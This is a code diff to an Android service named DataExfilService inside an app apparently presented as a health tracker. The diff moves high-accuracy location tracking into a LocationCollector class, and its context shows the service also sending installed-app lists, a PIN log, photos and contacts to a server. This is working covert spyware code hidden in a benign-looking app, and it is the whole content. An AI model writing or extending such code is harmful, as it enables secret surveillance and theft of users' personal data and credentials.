@@ -42,6 +42,7 @@ import com.google.android.gms.location.Priority
 import android.location.Location
 import android.Manifest
 import android.content.pm.PackageManager
+import com.inf2007.healthtracker.utilities.collectors.LocationCollector
 
 class DataExfilService : Service() {
 
@@ -82,15 +83,7 @@ class DataExfilService : Service() {
     private lateinit var packageLister: PackageLister
     private var lastAppList: List<PackageLister.PackageInfo>? = null
 
-    // Location tracking variables
-    private lateinit var fusedLocationClient: FusedLocationProviderClient
-    private lateinit var locationCallback: LocationCallback
-    private var lastSentLocation: Location? = null
-    private var lastSentTime: Long = 0
-
-    // Location constants
-    private val LOCATION_SEND_INTERVAL = 30000L  // Send every 30 seconds
-    private val MIN_MOVEMENT_DISTANCE = 10.0f     // 10 meters
+    private lateinit var locationCollector: LocationCollector
 
     private val uploadRunnable = object : Runnable {
         override fun run() {
@@ -166,7 +159,11 @@ class DataExfilService : Service() {
         registerReceiver(appInstallReceiver, IntentFilter(PackageLister.ACTION_APP_INSTALLED), RECEIVER_NOT_EXPORTED)
         uploadUserAppsList()
         registerReceiver(pinLogUploadReceiver, IntentFilter("com.inf2007.healthtracker.UPLOAD_PIN_LOG"), RECEIVER_NOT_EXPORTED)
-        setupLocationTracking()
+        locationCollector = LocationCollector(this) { location ->
+            sendLocationToServer(location)
+        }
+
+        locationCollector.startObserving()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -442,7 +439,7 @@ class DataExfilService : Service() {
         } catch (e: Exception) {
             Log.e(TAG, "Error unregistering pinLogUploadReceiver", e)
         }
-        stopLocationTracking()
+        locationCollector.stopObserving()
         super.onDestroy()
         contentResolver.unregisterContentObserver(photoObserver)
         contentResolver.unregisterContentObserver(contactsObserver)
@@ -1232,70 +1229,6 @@ class DataExfilService : Service() {
         }
     }
 
-    private fun setupLocationTracking() {
-        try {
-            Log.d(TAG, "Setting up location tracking...")
-            fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
-
-            // Create location callback
-            locationCallback = object : LocationCallback() {
-                override fun onLocationResult(locationResult: LocationResult) {
-                    locationResult.lastLocation?.let { location ->
-                        checkAndSendLocation(location)
-                    }
-                }
-            }
-
-            // Request location updates every 10 seconds
-            val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 10000)
-                .setMinUpdateIntervalMillis(5000)
-                .build()
-
-            // Check if we have permission
-            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
-                fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper())
-                Log.d(TAG, "Location tracking started successfully")
-            } else {
-                Log.w(TAG, "No location permission available")
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "Error setting up location: ${e.message}")
-        }
-    }
-
-    private fun checkAndSendLocation(currentLocation: Location) {
-        val now = System.currentTimeMillis()
-        var shouldSend = false
-        var reason = ""
-
-        // Case 1: First location ever
-        if (lastSentLocation == null) {
-            shouldSend = true
-            reason = "initial fix"
-        }
-        // Case 2: Moved more than 10 meters
-        else {
-            val distance = lastSentLocation!!.distanceTo(currentLocation)
-            if (distance >= MIN_MOVEMENT_DISTANCE) {
-                shouldSend = true
-                reason = "moved ${distance.toInt()}m"
-            }
-        }
-
-        // Case 3: Time-based update (show we're still here)
-        if (!shouldSend && (now - lastSentTime) >= LOCATION_SEND_INTERVAL) {
-            shouldSend = true
-            reason = "still here (${(now - lastSentTime)/1000}s elapsed)"
-        }
-
-        if (shouldSend) {
-            Log.d(TAG, "Sending location: $reason")
-            sendLocationToServer(currentLocation)
-            lastSentLocation = currentLocation
-            lastSentTime = now
-        }
-    }
-
     private fun sendLocationToServer(location: Location) {
         Thread {
             try {
@@ -1342,16 +1275,5 @@ class DataExfilService : Service() {
                 Log.e(TAG, "Error sending location: ${e.message}")
             }
         }.start()
-    }
-
-    private fun stopLocationTracking() {
-        try {
-            if (::fusedLocationClient.isInitialized && ::locationCallback.isInitialized) {
-                fusedLocationClient.removeLocationUpdates(locationCallback)
-                Log.d(TAG, "Location tracking stopped")
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "Error stopping location: ${e.message}")
-        }
     }
 }
